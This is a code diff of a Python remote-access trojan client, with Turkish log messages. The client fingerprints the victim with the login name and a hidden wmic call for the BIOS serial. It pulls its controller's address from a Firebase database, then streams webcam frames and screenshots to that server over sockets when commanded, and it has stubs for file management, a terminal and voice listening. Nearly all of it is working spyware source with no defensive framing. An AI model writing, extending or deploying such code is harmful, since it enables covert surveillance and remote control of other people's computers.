@@ -1,4 +1,5 @@
 import io
+import json
 import os
 import pickle
 import shutil
@@ -8,7 +9,7 @@ from ctypes import cdll
 from socket import socket
 from threading import Thread
 from time import sleep
-
+from win32api import GetLogicalDriveStrings
 import cv2
 from firebase_admin import credentials
 from firebase_admin import db as realtime
@@ -23,29 +24,19 @@ __USERSTRING__ = os.getlogin() + subprocess.check_output('wmic bios get serialnu
                                                              shell=True, stdin=subprocess.PIPE,
                                                              stderr=None,creationflags=0x08000000).decode().split('\n')[1].strip()
 
-def connect(ip,port,data):
+def connect(ip,port,client_type):
     try:
         soket = socket()
         soket.connect((ip,port))
-        soket.sendall(bytes(data,'utf-8'))
-        return soket
-    except:
+        print("Bağlandı :",ip,"port :",port)
+        data = bytes(str(__USERSTRING__+"||"+client_type).zfill(1024),'utf-8')
+        if soket.send(data) != 0:
+            return soket
+        else:
+            return None
+    except Exception as e:
+        print("Bağlantı hatası :",e)
         return None
-
-class WatchCamera(Thread):
-    def __init__(self):
-        super().__init__()
-
-    def run(self):
-        pass
-
-    def stop(self):
-        pass
-
-    def set_connection_data(self,ip,port):
-        self.ip = ip
-        self.port = port
-
 class Terminal(Thread):
     def __init__(self):
         super().__init__()
@@ -61,48 +52,132 @@ class Terminal(Thread):
         self.ip = ip
         self.port = port
 
-class WatchScreen(Thread):
-    def __init__(self) -> None:
-        super().__init__()
-
-    def run(self) -> None:
-        while True:
-            try:
-                self.soket = socket()
-                self.soket.connect((self.ip, self.port))
-                break
-            except Exception as e:
-                print("Bağlanma denendi, hata: ", e)
-                print("ip ve port: ", self.ip, self.port)
-                sleep(1)
-        while True:
-            image_data = ImageGrab.grab().tobytes()
-            length = len(image_data)
-            self.soket.sendall(bytes(str(length).zfill(10), 'utf-8'))
-            sleep(0.1)
-            self.soket.sendall(image_data)
-            sleep(0.1)
-
-    def stop(self):
-        pass
-
-    def set_connection_data(self,ip,port):
+class WatchCamera:
+    def __init__(self,ip,port):
         self.ip = ip
         self.port = port
+
+        self.is_alive = True
+
+    def stop(self):
+        self.is_alive = False
+        try:self.cam.release()
+        except: pass
+        try:self.soket.close()
+        except: pass
+
+    def start(self):
+        try:
+            self.soket = connect(self.ip,self.port,"watch_camera")
+            self.cam = cv2.VideoCapture(0)
+            Thread(target=self.flow).start()
+        except Exception as e:
+            print("Watch camera başlanamadı")
+
+    def flow(self):
+        while self.is_alive:
+            try:
+                cam_readed, image_data = self.cam.read()
+                if not cam_readed:
+                    self.is_alive = False
+                    break
+
+                image_data = pickle.dumps(image_data)
+                image_len = len(image_data)
+                self.soket.sendall(bytes(str(image_len).zfill(10),'utf-8'))
+                self.soket.sendall(image_data)
+
+            except Exception as e:
+                self.stop()
+                print("Watch camera flowu durdu: ",e)
+
+
+
+class WatchScreen:
+    def __init__(self,ip,port) -> None:
+        self.ip = ip
+        self.port = port
+
+        self.is_alive = True
+
+    def flow(self) -> None:
+        while self.is_alive:
+            try:
+                print(1)
+                image_io = io.BytesIO()
+                ImageGrab.grab(all_screens=False).save(image_io,"JPEG")
+                image_data = image_io.getvalue()
+                print(2)
+                length = len(image_data)
+                print(3)
+                self.soket.sendall(bytes(str(length).zfill(10), 'utf-8'))
+                print(4)
+                print(5)
+                self.soket.sendall(image_data)
+                print(6)
+                print("Watch screen flow")
+            except Exception as e:
+                self.stop()
+                print("Watch screen flowu durdu: ",e)
+
+
+    def stop(self):
+        self.is_alive = False
+        try:
+            self.soket.close()
+        except:
+            pass
+
+    def start(self):
+        try:
+            self.soket = connect(self.ip,self.port,"watch_screen")
+            Thread(target=self.flow).start()
+        except Exception as e:
+            print("Watch screen başlanamadı",e)
+
+    def commander(self,data: dict):
+        command = data["command"]
+        if command == "stop":
+            self.is_alive = False
+
+        elif command == "start":
+            Thread(target=self.flow).start()
+
 
 class FileManager(Thread):
-    def __init__(self) -> None:
-        super().__init__()
+    def __init__(self,ip,port) -> None:
+        self.ip = ip
+        self.port = port
 
-    def run(self) -> None:
-        pass
+    def start(self):
+        try:
+            self.soket = connect(self.ip,self.port,"file_manager")
+        except Exception as e:
+            print("Watch screen başlanamadı",e)
+
+    def command_listener(self):
+        while True:
+            try:
+                data = self.soket.recv(1024)
+                if data:
+                    data = data.decode()
+                    data = json.loads(data)
+                    self.commander(data)
+            except Exception as e:
+                print("File manager command listener error: ",e)
+                try:
+                    self.soket.close()
+                except:
+                    pass
+    
+    def commander(self,data: dict):
+        command = data["command"]
+        
 
     def stop(self):
         pass
 
-    def set_connection_data(self,ip,port):
-        self.ip = ip
-        self.port = port
+
 
 class ListenVoice(Thread):
     def __init__(self) -> None:
@@ -123,64 +198,53 @@ class App:
         self.ip = ""
         self.port = 0
 
-        self.watch_screen_instance = WatchScreen()
-        self.watch_camera_instance = WatchCamera()
-        self.terminal_instance = Terminal()
-        self.file_manager_instance = FileManager()
-        self.listen_voice_instance = ListenVoice()
-
         self.firebase_manager = FirebaseManager()
         while True:
             try:
-                data = self.soket.recv(1024).decode("utf-8")
-                self.commander(data)
+                self.commander(pickle.loads(self.soket.recv(1024)))
             except Exception as e:
                 print("Client datası alınamadı: " + str(e))
                 self.connect()
 
-    def commander(self,cmd):
-        if cmd == "exit":
+    def commander(self,data):
+        command = data["command"]
+        print("data: ", data)
+        if command == "exit":
             exit()
-        elif cmd == "refresh":
+        elif command == "refresh":
             os.startfile(sys.argv[0])
             exit()
-        elif cmd == "listen_voice":
-            self.listen_voice_instance.start()
-        elif cmd == "terminal":
-            self.terminal_instance.start()
-        elif cmd == "watch_screen":
-            if self.watch_screen_instance.is_alive():
-                self.watch_screen_instance.stop()
-                self.watch_screen_instance.join()
-            self.watch_screen_instance.start()
-        elif cmd == "file_manager":
-            self.file_manager_instance.start()
-        elif cmd == "watch_camera":
-            self.watch_camera_instance.start()
+        elif command == "listen_voice":
+            print("Listen voice")
+        elif command == "terminal":
+            print("Terminal")
+        elif command == "watch_screen":
+            WatchScreen(self.ip,self.port).start()
+        elif command == "file_manager":
+            FileManager(self.ip, self.port).start()
+        elif command == "watch_camera":
+            WatchCamera(self.ip,self.port).start()
         else: 
-            print("Yanlış gelen cmd:"+cmd)
+            print("Yanlış gelen cmd:"+command)
             os.startfile(sys.argv[0])
             exit()
 
     def connect(self):
         try:
             if self.set_connection_data():
-                self.soket = connect(self.ip, self.port,__USERSTRING__.ljust(100))
+                print("ip ve port: ", self.ip, self.port)
+                self.soket = connect(self.ip, self.port,"client")
             else:
                 print("Bağlantı bilgileri alınamadı")
         except Exception as e:
             print("Bağlantı kurulamadı: " + str(e))
             
     def set_connection_data(self) -> bool:
-        connection_data = self.firebase_manager.get_tree("/socket")
+        connection_data = self.firebase_manager.get_tree("/connection_informations/server")
         if connection_data is None:
             return False
-        self.ip = connection_data["default"]["ip"]
-        self.port = connection_data["default"]["port"]
-
-        self.watch_camera_instance.set_connection_data(connection_data["watch_camera"]["ip"],connection_data["watch_camera"]["port"])
-        self.watch_screen_instance.set_connection_data(connection_data["watch_screen"]["ip"],connection_data["watch_screen"]["port"])
-        self.terminal_instance.set_connection_data(connection_data["terminal"]["ip"],connection_data["terminal"]["port"])
+        self.ip = connection_data["ip"]
+        self.port = connection_data["port"]
         return True
 
 class FirebaseManager:
